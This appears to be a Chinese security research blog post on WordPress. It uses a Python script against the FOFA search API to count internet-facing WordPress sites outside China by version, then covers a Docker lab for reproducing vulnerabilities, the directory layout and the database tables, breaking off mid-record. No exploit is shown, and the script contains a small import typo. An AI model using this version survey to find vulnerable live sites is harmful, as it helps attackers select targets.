<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="eebefd600cc06d2e1e5c99f146b63fd5">0.主流版本测绘</h2>
<ul>
<li>branch.txt内容爬取<a href="https://github.com/WordPress/WordPress/branches" target="_blank">https://github.com/WordPress/WordPress/branches</a>
</li>
<li>通过fofa-api搜索wordpress-{branch-version} &amp;&amp; country!="CN"来粗略统计境外wordpress各版本占有率</li>
<li>不考虑指纹伪造</li>
<li>不考虑蜜罐</li>
</ul>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base6</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">"https://fofa.info/api/v1/search/all?email=&amp;key=&amp;qbase64="</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'branch.txt'</span><span class="p">,</span><span class="s1">'r+'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
        <span class="n">query</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'"wordpress-{i.strip()}" &amp;&amp; country!="CN"'</span>
        <span class="n">query</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span><span class="o">.</span><span class="n">text</span>
        <span class="n">json_res</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
        <span class="n">size</span> <span class="o">=</span> <span class="n">json_res</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span>
        <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">size</span><span class="p">))</span>

        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

    <span class="n">sorted_results</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">results</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">sorted_results</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s1">'境外服务器wordpress{item[0]}的数量为：{item[1]}'</span><span class="p">)</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="vg">境外服务器wordpress4</span><span class="mf">.5</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">718094</span>
<span class="vg">境外服务器wordpress6</span><span class="mf">.0</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">571377</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.8</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">432132</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.5</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">283633</span>
<span class="vg">境外服务器wordpress6</span><span class="mf">.1</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">225618</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.3</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">84358</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.3</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">84358</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.1</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">60874</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.9</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">48913</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.8</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">34542</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.6</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">29029</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.8</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">23605</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.7</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">23375</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.4</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">11904</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.5</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">10843</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.0</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">8106</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.2</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">5474</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.1</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">5428</span>
<span class="vg">境外服务器wordpress5</span><span class="mf">.1</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">5373</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.6</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">3308</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.6</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">3065</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.0</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">2992</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.0</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">2788</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.7</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">2110</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.5</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">2094</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.3</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">2075</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.3</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">1934</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.9</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">1838</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.4</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">1774</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.7</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">1558</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.4</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">1251</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.9</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">945</span>
<span class="vg">境外服务器wordpress1</span><span class="mf">.5</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">863</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.8</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">757</span>
<span class="vg">境外服务器wordpress4</span><span class="mf">.2</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">381</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.6</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">234</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.2</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">220</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.9</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">219</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.3</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">209</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.0</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">200</span>
<span class="vg">境外服务器wordpress3</span><span class="mf">.7</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">158</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.2</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">152</span>
<span class="vg">境外服务器wordpress2</span><span class="mf">.1</span><span class="vg">的数量为</span><span class="err">：</span><span class="il">152</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/21402865/1682085135767-4b14331b-3aad-4faa-91e1-5fc964a85a4b.png#averageHue=%23010101&amp;clientId=ueb421bfe-1796-4&amp;from=paste&amp;height=500&amp;id=uac645a68&amp;originHeight=1000&amp;originWidth=1800&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=188804&amp;status=done&amp;style=none&amp;taskId=u124028da-8467-4e58-84de-b9cc5168a83&amp;title=&amp;width=900"/><br/>
Top5: <a href="https://github.com/WordPress/WordPress/tree/4.5-branch" target="_blank">4.5</a>、<a href="https://github.com/WordPress/WordPress/tree/6.0-branch" target="_blank">6.0</a>、<a href="https://github.com/WordPress/WordPress/tree/4.8-branch" target="_blank">4.8</a>、<a href="https://github.com/WordPress/WordPress/tree/2.5-branch" target="_blank">2.5</a>、<a href="https://github.com/WordPress/WordPress/tree/6.1-branch" target="_blank">6.1</a></p>
<h1 data-content="1" id="5fcf02429ef1e5b4d14dc160cd66763c">1.使用研究</h1>
<h2 data-content="1" id="12240e0c3ecde67fe643f46d0e69d165">1.1环境搭建</h2>
<blockquote>
<p>测试环境整体采用docker部署，主要部署主流版本来进行漏洞复现及相关研究。</p>
</blockquote>
<h3 data-content="1" id="edbd9332ae464925bd1e11b4075a0c74">1.1.1 wordpress4.5</h3>
<div class="highlight"><pre><span></span><span class="nl">version:</span> <span class="s1">'3.9'</span>
<span class="nl">services:</span>
  <span class="nl">db:</span>
    <span class="nl">image:</span> <span class="nl">mariadb:</span><span class="m">10.6</span><span class="p">.</span><span class="m">4</span><span class="o">-</span><span class="n">focal</span>
    <span class="nl">restart:</span> <span class="n">always</span>
    <span class="nl">environment:</span>
      <span class="nl">MYSQL_ROOT_PASSWORD:</span> <span class="m">123456</span>
      <span class="nl">MYSQL_DATABASE:</span> <span class="n">wordpress</span>
    <span class="nl">volumes:</span>
      <span class="o">-</span> <span class="p">.</span><span class="o">/</span><span class="nl">database:</span><span class="o">/</span><span class="kd">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span>

  <span class="nl">wordpress:</span>
    <span class="nl">depends_on:</span>
      <span class="o">-</span> <span class="n">db</span>
    <span class="nl">image:</span> <span class="nl">wordpress:</span><span class="m">4.5</span><span class="o">-</span><span class="n">apache</span>
    <span class="nl">restart:</span> <span class="n">always</span>
    <span class="nl">ports:</span>
      <span class="o">-</span> <span class="m">80</span><span class="o">:</span><span class="m">80</span>
    <span class="nl">environment:</span>
      <span class="nl">WORDPRESS_DB_HOST:</span> <span class="nl">db:</span><span class="m">3306</span>
      <span class="nl">WORDPRESS_DB_USER:</span> <span class="n">root</span>
      <span class="nl">WORDPRESS_DB_PASSWORD:</span> <span class="m">123456</span>
    <span class="nl">volumes:</span>
      <span class="o">-</span> <span class="p">.</span><span class="o">/</span><span class="nl">html:</span><span class="o">/</span><span class="kd">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span>
</pre></div>
<p>「初始化过程略」<br/>
<img src="https://cdn.nlark.com/yuque/0/2023/png/21402865/1681999502912-a91d2048-9280-432c-9978-b6b9dbed306b.png#averageHue=%23e3e3e3&amp;clientId=uc2709edc-b9f7-4&amp;from=paste&amp;height=868&amp;id=ue23e5315&amp;originHeight=1736&amp;originWidth=3082&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=452210&amp;status=done&amp;style=none&amp;taskId=u9607e5b7-d86f-4283-8c13-9a3475919ba&amp;title=&amp;width=1541"/></p>
<h3 data-content="1" id="7468e80d08e16e27dd2e69c939f98c7b">1.1.2 wordpress目录结构说明</h3>
<ol>
<li>
<strong>根目录文件</strong>：这些是WordPress的核心文件，用于处理请求和加载其他文件。<ul>
<li>
<strong>index.php</strong>：网站的主入口文件。</li>
<li>
<strong>license.txt</strong>：WordPress的许可证文件。</li>
<li>
<strong>readme.html</strong>：安装和升级信息的HTML文件。</li>
<li>
<strong>wp-activate.php</strong>：激活新用户的脚本。</li>
<li>
<strong>wp-blog-header.php</strong>：加载WordPress环境和模板。</li>
<li>
<strong>wp-comments-post.php</strong>：处理发表评论的请求。</li>
<li>
<strong>wp-config-sample.php</strong>：WordPress配置文件的样本。</li>
<li>
<strong>wp-config.php</strong>：WordPress的主配置文件，包含数据库信息等设置。</li>
<li>
<strong>wp-cron.php</strong>：处理WordPress计划任务的脚本。</li>
<li>
<strong>wp-links-opml.php</strong>：用于OPML格式的链接导出。</li>
<li>
<strong>wp-load.php</strong>：加载WordPress的核心文件。</li>
<li>
<strong>wp-login.php</strong>：登录页面的主文件。</li>
<li>
<strong>wp-mail.php</strong>：通过电子邮件发布文章的脚本。</li>
<li>
<strong>wp-settings.php</strong>：设置WordPress变量和包含文件。</li>
<li>
<strong>wp-signup.php</strong>：新用户注册的脚本。</li>
<li>
<strong>wp-trackback.php</strong>：处理trackback请求的脚本。</li>
<li>
<strong>xmlrpc.php</strong>：实现XML-RPC协议支持。</li>
</ul>
</li>
<li>
<strong>wp-admin</strong>：包含WordPress后台管理相关的文件。<ul>
<li>这个目录包含了控制WordPress仪表盘和管理功能的所有脚本和文件。</li>
</ul>
</li>
<li>
<strong>wp-content</strong>：用户内容和扩展的存储地。<ul>
<li>这个目录包含主题（<strong>themes</strong>）、插件（<strong>plugins</strong>）和上传的文件（<strong>uploads</strong>）。</li>
</ul>
</li>
<li>
<strong>wp-includes</strong>：包含WordPress的主要PHP库和辅助脚本。<ul>
<li>这个目录包含了WordPress运行所需的大部分核心功能代码。</li>
</ul>
</li>
</ol>
<h2 data-content="1" id="8af4fd1b36cb5d90984813f7193722e5">1.2数据库表结构与内容研究</h2>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
<span class="o">+</span><span class="c1">-----------------------+</span>
<span class="o">|</span> <span class="n">Tables_in_wordpress</span>   <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------------------+</span>
<span class="o">|</span> <span class="n">wp_commentmeta</span>        <span class="o">|</span>  <span class="err">存储评论元数据</span>
<span class="o">|</span> <span class="n">wp_comments</span>           <span class="o">|</span>  <span class="err">存储网站评论</span>
<span class="o">|</span> <span class="n">wp_links</span>              <span class="o">|</span>  <span class="err">存储网站友情链接</span>
<span class="o">|</span> <span class="n">wp_options</span>            <span class="o">|</span>  <span class="err">存储</span><span class="n">wordpress设置和选项</span><span class="err">、主题配置等</span>
<span class="o">|</span> <span class="n">wp_postmeta</span>           <span class="o">|</span>  <span class="err">存储文章的元数据</span>
<span class="o">|</span> <span class="n">wp_posts</span>              <span class="o">|</span>  <span class="err">存储网站文章</span>
<span class="o">|</span> <span class="n">wp_term_relationships</span> <span class="o">|</span>  <span class="err">存储分类、标签和帖子之间的关系</span>
<span class="o">|</span> <span class="n">wp_term_taxonomy</span>      <span class="o">|</span>  <span class="err">存储每个目录、标签所对应的分类</span>
<span class="o">|</span> <span class="n">wp_termmeta</span>           <span class="o">|</span>  <span class="err">存储目录、标签对应的元数据</span>
<span class="o">|</span> <span class="n">wp_terms</span>              <span class="o">|</span>  <span class="err">存储每个目录、标签</span>
<span class="o">|</span> <span class="n">wp_usermeta</span>           <span class="o">|</span>  <span class="err">存储用户的元数据</span>
<span class="o">|</span> <span class="n">wp_users</span>              <span class="o">|</span>  <span class="err">存储用户</span>
<span class="o">+</span><span class="c1">-----------------------+</span>
<span class="mi">12</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">003</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<h3 data-content="1" id="b8e9a4ee816b2c216b27f4825502bbf3">1.2.1 Metadata元数据</h3>
<p>注意到在十二张数据表中有四张表带有meta关键字，其中存储的就是相关信息的元数据<br/>
在翻阅许多文献后可以总结元数据的定义 -- “data about data”关于数据的数据<br/>
例如，对于一篇文章，它的元数据可以包含作者、发布日期、标签、分类、评论数、浏览量等信息，这些元数据存储在wp_postmeta表中。这些元数据可以被wordpress主题、插件使用，为网站提供更多的灵活性和扩展性。<br/>
<img src="https://cdn.nlark.com/yuque/0/2023/png/21402865/1682089125395-9512da71-2627-4ee3-b3b1-608fefb12bb0.png#averageHue=%23202227&amp;clientId=ueb421bfe-1796-4&amp;from=paste&amp;height=855&amp;id=u21d2a95f&amp;originHeight=1710&amp;originWidth=1380&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=297499&amp;status=done&amp;style=none&amp;taskId=u7648658e-6564-4d19-8fcd-dd9d0473023&amp;title=&amp;width=690"/><br/>
这四张表的字段交集为：meta_id、meta_key、meta_value<br/>
NISO把元数据分为了描述性、结构性、管理性三类</p>
<blockquote>
<p>结构化的元数据（Structural metadata）是有关数据结构的设计和说明，通常叫做“关于数据容器的数据（data about the containers of data）；描述性的元数据（descriptive metadata），关于应用程序数据和数据内容的单个实例 ...</p>
</blockquote>
<p>按照这个定义，wordpress使用描述性元数据。<br/>
而在wordpress中，数据与元数据的定义边界模糊不清。定义元数据也不等于它就会被存储于元数据表中，比如：<br/>
post_type应该属于元数据的范畴，可是它被存储在wp_posts中，而非wp_postmeta<br/>
<img src="https://cdn.nlark.com/yuque/0/2023/png/21402865/1682088737231-8cde4370-a6cd-4b4c-844d-2038adb5d170.png#averageHue=%2321242a&amp;clientId=ueb421bfe-1796-4&amp;from=paste&amp;height=602&amp;id=ud8f8f058&amp;originHeight=1204&amp;originWidth=1780&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=263056&amp;status=done&amp;style=none&amp;taskId=ubd513985-08e4-4739-8128-1366659c092&amp;title=&amp;width=890"/></p>
<h3 data-content="1" id="7a3a9b89ceab3635e034dacb883a6d57">1.2.2 关于文章 [wp_posts &amp;&amp; wp_postmeta]</h3>
<h4 data-content="1" id="05b9d24c5793cafed5b0208ec8dded69">wp_posts表结构</h4>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">desc</span> <span class="n">wp_posts</span><span class="p">;</span>
<span class="o">+</span><span class="c1">-----------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="o">|</span> <span class="n">Field</span>                 <span class="o">|</span> <span class="k">Type</span>                <span class="o">|</span> <span class="k">Null</span> <span class="o">|</span> <span class="k">Key</span> <span class="o">|</span> <span class="k">Default</span>             <span class="o">|</span> <span class="n">Extra</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="o">|</span> <span class="n">ID</span>                    <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">PRI</span> <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span> <span class="n">auto_increment</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">post_author</span>           <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_date</span>             <span class="o">|</span> <span class="n">datetime</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0000</span><span class="o">-</span><span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_date_gmt</span>         <span class="o">|</span> <span class="n">datetime</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0000</span><span class="o">-</span><span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_content</span>          <span class="o">|</span> <span class="n">longtext</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_title</span>            <span class="o">|</span> <span class="nb">text</span>                <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_excerpt</span>          <span class="o">|</span> <span class="nb">text</span>                <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_status</span>           <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="n">publish</span>             <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_status</span>        <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">open</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">ping_status</span>           <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">open</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_password</span>         <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_name</span>             <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">to_ping</span>               <span class="o">|</span> <span class="nb">text</span>                <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">pinged</span>                <span class="o">|</span> <span class="nb">text</span>                <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_modified</span>         <span class="o">|</span> <span class="n">datetime</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0000</span><span class="o">-</span><span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_modified_gmt</span>     <span class="o">|</span> <span class="n">datetime</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0000</span><span class="o">-</span><span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_content_filtered</span> <span class="o">|</span> <span class="n">longtext</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_parent</span>           <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">guid</span>                  <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">menu_order</span>            <span class="o">|</span> <span class="nb">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>             <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_type</span>             <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="n">post</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">post_mime_type</span>        <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_count</span>         <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>          <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="mi">23</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">004</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">ID</span>  <span class="err">自增唯一</span><span class="n">ID</span>
<span class="n">post_author</span> <span class="err">对应作者</span><span class="n">ID</span>
<span class="n">post_date</span>   <span class="err">发布时间</span>
<span class="n">post_date_gmt</span>   <span class="err">发布时间（</span><span class="n">GMT</span><span class="o">+</span><span class="mi">0</span><span class="err">时间）</span>
<span class="n">post_content</span>    <span class="err">正文</span>
<span class="n">post_title</span>  <span class="err">标题</span>
<span class="n">post_excerpt</span>    <span class="err">摘要</span>
<span class="n">post_status</span> <span class="err">文章状态</span><span class="p">(</span><span class="n">publish</span><span class="o">/</span><span class="n">auto</span><span class="o">-</span><span class="n">draft</span><span class="o">/</span><span class="n">inherit等</span><span class="p">)</span>
<span class="n">comment_status</span>  <span class="err">评论状态</span><span class="p">(</span><span class="k">open</span><span class="o">/</span><span class="n">closed</span><span class="p">)</span>
<span class="n">ping_status</span> <span class="n">ping状态</span><span class="err">（</span><span class="k">open</span><span class="o">/</span><span class="n">closed</span><span class="err">）</span>
<span class="n">post_password</span>   <span class="err">文章密码</span>
<span class="n">post_name</span>   <span class="err">文章缩略名</span>
<span class="n">to_ping</span> <span class="err">文章待</span><span class="n">ping的url列表</span>
<span class="n">pinged</span>  <span class="err">已经</span><span class="n">ping过的链接</span>
<span class="n">post_modified</span>   <span class="err">修改时间</span>
<span class="n">post_modified_gmt</span>   <span class="err">修改时间（</span><span class="n">GMT</span><span class="o">+</span><span class="mi">0</span><span class="err">时间）</span>
<span class="n">post_content_filtered</span>   <span class="err">转换后的内容</span>
<span class="n">post_parent</span> <span class="err">父文章</span>
<span class="n">guid</span>    <span class="err">全局唯一标识符</span>
<span class="n">menu_order</span>  <span class="err">排序</span><span class="n">ID</span>
<span class="n">post_type</span>   <span class="err">文章类型</span>
<span class="n">post_mime_type</span>  <span class="n">MIME类型</span>
<span class="n">comment_count</span>   <span class="err">评论总数</span>
</pre></div>
<h4 data-content="1" id="a9f4cb8a924a87397c8269205c20819d">数据内容研究</h4>
<p>新建一篇文章，查询wp_posts内容，抽取一条数据作为示例</p>
<div class="highlight"><pre><span></span><span class="o">***************************</span> <span class="mi">5</span><span class="p">.</span> <span class="k">row</span> <span class="o">***************************</span>
                   <span class="n">ID</span><span class="p">:</span> <span class="mi">5</span>
          <span class="n">post_author</span><span class="p">:</span> <span class="mi">1</span>
            <span class="n">post_date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">14</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">42</span>
